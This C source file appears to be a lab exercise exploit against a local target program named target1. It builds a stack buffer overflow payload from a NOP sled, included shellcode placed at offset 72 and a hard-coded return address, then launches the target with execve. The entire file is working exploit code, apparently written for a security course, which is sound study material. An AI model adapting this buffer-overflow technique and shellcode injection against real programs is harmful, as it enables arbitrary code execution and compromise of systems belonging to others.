#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"
#define SIZE 128
#define SHELL_OFFSET 72

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	args[0] = TARGET;

	char str[SIZE];

	// Insert NOPs
	memset(str, 0x90, SIZE);

	// Insert shellcode
	for (int i = 0; i < strlen(shellcode); i++)
		str[i + SHELL_OFFSET] = shellcode[i];

	// Insert return address
	*(long*) &str[120] = 0x3021fe50;

	args[1] = str;
	args[2] = NULL;
	env[0] = NULL;

	if ( execve(TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
